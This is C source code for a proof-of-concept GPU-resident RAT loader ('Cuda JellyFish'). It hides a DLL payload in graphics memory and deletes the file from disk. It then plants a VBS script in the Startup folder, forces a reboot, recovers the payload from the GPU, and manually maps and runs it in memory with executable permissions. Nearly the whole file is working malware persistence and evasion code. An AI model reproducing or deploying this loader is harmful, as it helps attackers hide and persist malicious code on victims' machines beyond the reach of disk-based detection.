///////////////////////////////////////////////////////////////////////////////
//
// Gone but not forgotten, 
// dead or alive, 
// in the name of the unresolved, 
// here it is...
//
// The Cuda JellyFish ~ There's A RAT In My GPU What I'm A Gonna Do?
//
// By x0r, Vozzie, Team Jellyfish, ...
//
//=============================================================================
//=============================================================================

#include "jellycuda.h"

const GUID FOLDERID_Startup = {0xB97D20BB, 0xF46A, 0x4C97, 0xBA, 0x10, 0x5E, 0x36, 0x08, 0x43, 0x08, 0x54};

JellyCuda jc;

ULONG_PTR AllocateGPUMemory(DWORD dwMax, DWORD dwMin, LPDWORD lpdwSize)
{
	ULONG_PTR gpumem;
	*lpdwSize = dwMax;
	while(*lpdwSize >= dwMin)
	{
		if(CUDAFAIL(jc.fncuMemAlloc((void*)&gpumem, *lpdwSize))) *lpdwSize >>= 2;
		else return gpumem;		
	}
	*lpdwSize = 0;
	return 0;
}

BOOL ExecuteJellyDust(LPVOID lpvDust)
{
	DWORD dwCount1;
	DWORD dwCount2;
	PBYTE pSource;
	PBYTE pTarget;
	HMODULE hLibrary;
	PIMAGE_BASE_RELOCATION pRelocBase;
	PIMAGE_DATA_DIRECTORY pDir;
	PIMAGE_DOS_HEADER pDos;
	PIMAGE_NT_HEADERS pNt;
	PIMAGE_SECTION_HEADER pSection;
	PIMAGE_EXPORT_DIRECTORY pExport;
	PIMAGE_IMPORT_DESCRIPTOR pImport;
	PIMAGE_RELOC pReloc;
	PIMAGE_THUNK_DATA pThunk;
	LPFNDllMain pDllMain;
	LPFNNtFlushInstructionCache pNtFlushInstructionCache;
	LPVOID lpvTarget;
	ULONG_PTR ulPointer;
	ULONG_PTR ulThunk;
	ULONG_PTR ulVA;
	pNt = MakePtr(PIMAGE_NT_HEADERS, lpvDust, ((PIMAGE_DOS_HEADER)lpvDust)->e_lfanew);
	lpvTarget = VirtualAlloc(NULL, pNt->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	// Copy headers.
	dwCount1 = pNt->OptionalHeader.SizeOfHeaders;
	pSource = lpvDust;
	pTarget = lpvTarget;
	while(dwCount1--) *pTarget++ = *pSource++;
	// Map sections.
	pSection = MakePtr(PIMAGE_SECTION_HEADER, &pNt->OptionalHeader, pNt->FileHeader.SizeOfOptionalHeader);
	dwCount1 = pNt->FileHeader.NumberOfSections;	
	while(dwCount1--)
	{
		pTarget = (LPBYTE)((DWORD)lpvTarget + pSection->VirtualAddress);
		pSource = (LPBYTE)((DWORD)lpvDust + pSection->PointerToRawData);
		dwCount2 = pSection->SizeOfRawData;
		while(dwCount2--) *pTarget++ = *pSource++;
		pSection++;
	}
	// Process imports
	pDir = &pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	if(pDir->Size)
	{
		pImport = MakePtr(PIMAGE_IMPORT_DESCRIPTOR, lpvTarget, pDir->VirtualAddress);
		while(pImport->Name)
		{
			hLibrary = LoadLibraryA(MakePtr(LPCSTR, lpvTarget, pImport->Name));
			pThunk = MakePtr(PIMAGE_THUNK_DATA, lpvTarget, pImport->OriginalFirstThunk);
			ulThunk = MakePtr(ULONG_PTR, lpvTarget, pImport->FirstThunk);
			while(*(ULONG_PTR*)ulThunk)
			{
				// By ordinal? not in this image
				if(pThunk && pThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG)
				{
					pDos = (PIMAGE_DOS_HEADER)hLibrary;
					pDir = &MakePtr(PIMAGE_NT_HEADERS, (ULONG_PTR)hLibrary, pDos->e_lfanew)->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
					pExport = MakePtr(PIMAGE_EXPORT_DIRECTORY, (ULONG_PTR)hLibrary, pDir->VirtualAddress);
					ulPointer = pExport->AddressOfFunctions + (ULONG_PTR)hLibrary;
					ulPointer += (IMAGE_ORDINAL(pThunk->u1.Ordinal) - pExport->Base) * sizeof(DWORD);
					*(ULONG_PTR*)ulThunk = (ULONG_PTR)hLibrary + *(ULONG_PTR*)ulPointer;
				}
				else
				{
					*(ULONG_PTR*)ulThunk = (ULONG_PTR)GetProcAddress(hLibrary, (LPCSTR)MakePtr(PIMAGE_IMPORT_BY_NAME, lpvTarget, *(ULONG_PTR*)ulThunk)->Name);
				}
				ulThunk += sizeof(ULONG_PTR);
				if(pThunk) pThunk = MakePtr(PIMAGE_THUNK_DATA, pThunk, sizeof(ULONG_PTR));
			}
			pImport++;
		}
	}
	// Relocations
	pDir = &pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	if(pDir->Size)
	{
		ulPointer = MakePtr(ULONG_PTR, lpvTarget, -pNt->OptionalHeader.ImageBase);
		pRelocBase = MakePtr(PIMAGE_BASE_RELOCATION, lpvTarget, pDir->VirtualAddress);
		while(pRelocBase->SizeOfBlock)
		{
			ulVA = MakePtr(ULONG_PTR, lpvTarget, pRelocBase->VirtualAddress);
			dwCount1 = (pRelocBase->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(IMAGE_RELOC);
			pReloc = MakePtr(PIMAGE_RELOC, pRelocBase, sizeof(IMAGE_BASE_RELOCATION));
			while(dwCount1--)
			{
				if(pReloc->type == IMAGE_REL_BASED_DIR64)
					*(ULONG_PTR *)(ulVA + pReloc->offset) += ulPointer;
				else if(pReloc->type == IMAGE_REL_BASED_HIGHLOW)
					*(DWORD *)(ulVA + pReloc->offset) += (DWORD)ulPointer;
				else if(pReloc->type == IMAGE_REL_BASED_HIGH)
					*(WORD *)(ulVA + pReloc->offset) += HIWORD(ulPointer);
				else if(pReloc->type == IMAGE_REL_BASED_LOW)
					*(WORD *)(ulVA + pReloc->offset) += LOWORD(ulPointer);
				pReloc++;
			}
			pRelocBase = MakePtr(PIMAGE_BASE_RELOCATION, pRelocBase, pRelocBase->SizeOfBlock);
		}
	}
	pNtFlushInstructionCache = (LPFNNtFlushInstructionCache)GetProcAddress(GetModuleHandle("ntdll.dll"), "NtFlushInstructionCache");
	pNtFlushInstructionCache((HANDLE)-1, NULL, 0);
	// Run dll main
	pDllMain = MakePtr(LPFNDllMain, lpvTarget, pNt->OptionalHeader.AddressOfEntryPoint);
	return pDllMain((HINSTANCE)lpvTarget, DLL_PROCESS_ATTACH, NULL);
}

void SearchJellyDustOnGPU(void)
{
	DWORD dwMemSize;
	DWORD dwOffset;
	HGLOBAL ram;
	PJellyDust pJellyDust;
	ULONG_PTR gpu;
	LPVOID lpvDust;
	// Search in up to one GIG of memory dust
	if((gpu = AllocateGPUMemory(GIGA, 64 * MEGA, &dwMemSize)) == 0)
	{
		MessageBox(NULL, TEXT("Failed to allocate GPU memory."), TEXT("err"), MB_TOPMOST | MB_ICONERROR);
		return;
	}
	// Allocate local RAM memory, 
	// probably possible to copy code to the GPU
	// and search the PJellyDust data from there 
	// and get the offset that way. (also decryption
	// would be better done there)
	if((ram = GlobalAlloc(GPTR, dwMemSize)) == NULL)
	{
		MessageBox(NULL, TEXT("Failed to allocate RAM memory."), TEXT("err"), MB_TOPMOST | MB_ICONERROR);
		return;
	}

	// clears GPU memory 
	
	//if(CUDAFAIL(jc.fncuMemcpyHtoD(gpu, ram, dwMemSize)));


	// Copy GPU memory to RAM
	if(CUDAFAIL(jc.fncuMemcpyDtoH(ram, gpu, dwMemSize)))
	{
		MessageBox(NULL, TEXT("Failed to copy memory from GPU to RAM."), TEXT("err"), MB_TOPMOST | MB_ICONERROR);
		return;
	}
	// Free GPU memory
	if(CUDAFAIL(jc.fncuMemFree(gpu)))
	{
		MessageBox(NULL, TEXT("Failed to free GPU memory."), TEXT("err"), MB_TOPMOST | MB_ICONERROR);
		return;
	}
	// If by accident the signature fits the last block checked,
	// it will cause a bug. If the size of the copied data is 
	// known it's not a problem... about 30k bytes in this case, 
	// taking 64
	dwMemSize -= sizeof(JellyDust) + (64 * 1024);
	for(dwOffset = 0; dwOffset < dwMemSize; dwOffset++)
	{
		// Match?
		pJellyDust = (PJellyDust)(((ULONG_PTR)ram) + dwOffset);
		if(pJellyDust->dwMagic == JELLY_MAGIC
		&&(ULONG_PTR)pJellyDust + sizeof(JellyDust) + pJellyDust->dwSize < dwMemSize + 1024
		&& pJellyDust->dwCS == GetDustCheckSum(pJellyDust->bData, pJellyDust->dwSize)
		){
			// ... Executing the dust ...
			lpvDust = HeapAlloc(GetProcessHeap(), 0, pJellyDust->dwSize);
			CopyMemory(lpvDust, pJellyDust->bData, pJellyDust->dwSize);
			GlobalFree(ram);
			ExecuteJellyDust(lpvDust);
			break;
		}		
	}
}

DWORD GetDustCheckSum(LPVOID lpDust, DWORD dwSize)
{
	PBYTE pbDust;
	DWORD dwCS;
	pbDust = (PBYTE)lpDust;
	dwCS = 0;
	while(dwSize--) dwCS = ror(dwCS ^ *pbDust++, 8);
	return dwCS;
}

HMODULE LoadCuda(void)
{
	HMODULE hCuda;
	char szFunc[MAX_PATH];
	ULONG_PTR lpAddress;
	static LPCSTR szFuncNames[] = {"cuCtxCreate_v2", "cuDeviceGet", "cuDeviceGetCount", "cuInit", "cuMemAlloc_v2", "cuMemcpyDtoH_v2", "cuMemcpyHtoD_v2", "cuMemFree_v2", NULL};	
	int i;
	char * p;
	hCuda = LoadLibrary(TEXT("nvcuda.dll"));
	if(hCuda == NULL) return NULL;
	lpAddress = (ULONG_PTR)(void*)&jc;
	for(i = 0; szFuncNames[i] ; i++)
	{
		*(ULONG_PTR*)lpAddress = (ULONG_PTR)GetProcAddress(hCuda, szFuncNames[i]);
		if(*(ULONG_PTR*)lpAddress == 0)
		{
			strcpy(szFunc, szFuncNames[i]);
			if((p = strstr(szFunc, "_v2")) != NULL)
			{
				*p = 0;
				*(ULONG_PTR*)lpAddress = (ULONG_PTR)GetProcAddress(hCuda, szFunc);
			}
		}
		if(*(ULONG_PTR*)lpAddress == 0)
		{
			FreeLibrary(hCuda);
			return NULL;
		}
		lpAddress += sizeof(ULONG_PTR);
	}
	return hCuda;
}

void Reboot(void)
{
	HANDLE hFile;
	LPCSTR szBatFormat = "set ws=CreateObject(\"WScript.Shell\")\r\nws.Run \"%s\"\r\nws.Run \"CMD /C DEL \"\"%s\"\"\"";
	LPWSTR pwszPath;
	CHAR szBatPath[MAX_PATH];
	CHAR szBat[2048];
	CHAR szModPath[MAX_PATH];
	DWORD dwWritten;
	HANDLE hToken;
	TOKEN_PRIVILEGES priv = {0};
	int len;
	if(SHGetKnownFolderPath(&FOLDERID_Startup, 0, NULL, &pwszPath) != S_OK)
	{
		return;
	}
	len = lstrlenW(pwszPath);
	wcstombs(szBatPath, pwszPath, len + 1);
	if(szBatPath[len-1] != '\\') 
	{
		szBatPath[len] = '\\';
		szBatPath[len+1] = 0;
	}
	lstrcatA(szBatPath, "jellyboot.vbs");
	if((hFile = CreateFileA(szBatPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE)
	{
		return;
	}
	if(GetModuleFileNameA(NULL, szModPath, MAX_PATH) == 0)
	{
		return;
	}
	wsprintfA(szBat, szBatFormat, szModPath, szBatPath);
	if(!WriteFile(hFile, szBat, lstrlenA(szBat), &dwWritten, NULL))
	{
		return;
	}
	CloseHandle(hFile);
	if(OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
	{
		priv.PrivilegeCount           = 1;
		priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		if( LookupPrivilegeValue( NULL, SE_SHUTDOWN_NAME, &priv.Privileges[0].Luid ) )
			AdjustTokenPrivileges( hToken, FALSE, &priv, 0, NULL, NULL );
		CloseHandle( hToken );
		MessageBox(NULL, TEXT("Gonna shut down ... close all documents ..."), TEXT("OK"), MB_TOPMOST|MB_ICONINFORMATION);
		ExitWindowsEx(EWX_SHUTDOWN | EWX_REBOOT | EWX_FORCE, 0);
	}
}


void SprayJellyDustToGPU(LPCTSTR lpszDllName)
{
	DWORD dwSize;
	DWORD dwDummy;
	DWORD dwMemSize;
	DWORD dwOffset;
	HANDLE hFile;
	HGLOBAL ram;
	LPVOID lpvFile;
	ULONG_PTR gpu;
	PJellyDust pJellyDust;
	PBYTE pbDustPointer;
	// Read dll
	if((hFile = CreateFile(lpszDllName, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL)) == INVALID_HANDLE_VALUE
	|| (dwSize = GetFileSize(hFile, NULL)) == 0
	|| (lpvFile = HeapAlloc(GetProcessHeap(), 0, dwSize + sizeof(JellyDust))) == NULL
	|| !ReadFile(hFile, ((PJellyDust)lpvFile)->bData, dwSize, &dwDummy, NULL)
	){
		MessageBox(NULL, TEXT("Failed to read dll,..."), TEXT("err"), MB_TOPMOST|MB_ICONERROR);
		return;
	}
	// Spray gpu memory with our dll
	if((gpu = AllocateGPUMemory(256*MEGA, 64*MEGA, &dwMemSize)) == 0)
	{
		MessageBox(NULL, TEXT("Failed to allocate GPU memory."), TEXT("err"), MB_TOPMOST | MB_ICONERROR);
		return;
	}

	// Initialize the jelly struct 
	pJellyDust = lpvFile;
	pJellyDust->dwMagic = JELLY_MAGIC;
	pJellyDust->dwSize = dwSize;
	pJellyDust->dwCS = GetDustCheckSum(pJellyDust->bData, dwSize);
	dwSize += sizeof(JellyDust);

	// .... Encrypt ....
	//

	// Allocate RAM (Host) memory
	ram = GlobalAlloc(GPTR, dwMemSize);
	if(ram == NULL)
	{
		MessageBox(NULL, TEXT("Failed to allocate RAM buffer memory."), TEXT("err"), MB_TOPMOST | MB_ICONERROR);
		return;
	}

	// Spray dust to RAM (Host) memory 
	// ( a process keep this memory locked until system shutdown )
	// ( The minimum memory range to store needs further research )
	dwMemSize -= dwSize;
	pbDustPointer = (PBYTE)ram;
	for(dwOffset = 0; dwOffset < dwMemSize; dwOffset += dwSize, pbDustPointer += dwSize)
		CopyMemory(pbDustPointer, pJellyDust, dwSize);
	dwMemSize += dwSize;

	// Copy RAM memory to GPU
	if(CUDAFAIL(jc.fncuMemcpyHtoD(gpu, ram, dwMemSize)))
	{
		MessageBox(NULL, TEXT("Failed to copy RAM memory to GPU."), TEXT("err"), MB_TOPMOST | MB_ICONERROR);
		return;
	}

	if(!CloseHandle(hFile)
	|| !DeleteFile(lpszDllName)
	){
		MessageBox(NULL, TEXT("GPU was sprayed with jelly dust but couldn't delete the jelly dll. Reboot canceled, remove the dll and reboot manually."), TEXT("err"), MB_TOPMOST | MB_ICONWARNING);
		return;
	}

	if(MessageBox(NULL
	, TEXT("GPU Memory Filled with \"jellydll.dll\".\r\nReboot and run this program again...\r\n\r\nDo you want to reboot?")
	, TEXT("Test...")
	, MB_TOPMOST | MB_YESNO | MB_ICONQUESTION) == IDYES
	){		
		Reboot();
	}
}

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	HMODULE hCuda;
	int nDevices;
	int device;
	CUcontext context;

	//hCuda = NULL;

	// Load cuda dll
	if((hCuda = LoadCuda()) == NULL)
	{
		MessageBox(NULL, TEXT("Failed to load cuda,..."), TEXT("err"), MB_TOPMOST|MB_ICONERROR);
		goto hell;
	}

	// Initialize cuda, 
	// count devices, 
	// get last device, 
	// create context
	if(CUDAFAIL(jc.fncuInit(0))
	||(CUDAFAIL(jc.fncuDeviceGetCount(&nDevices)) || nDevices == 0)
	||(CUDAFAIL(jc.fncuDeviceGet(&device, nDevices - 1)))
	||(CUDAFAIL(jc.fncuCtxCreate(&context, 0, device)))
	){
		MessageBox(NULL, TEXT("Failed to initialize cuda,..."), TEXT("err"), MB_TOPMOST|MB_ICONERROR);
		goto hell;
	}

	// Are we writing code to the GPU, 
	// or are we loading code from the GPU
	if(GetFileAttributes(TEXT(JELLY_DLL_NAME)) == INVALID_FILE_ATTRIBUTES 
	&& GetLastError() == ERROR_FILE_NOT_FOUND)
	{
		SearchJellyDustOnGPU();
	}
	else
	{
		SprayJellyDustToGPU(JELLY_DLL_NAME);		
	}

hell:
	if(hCuda != NULL) FreeLibrary(hCuda);
	return 0;
}
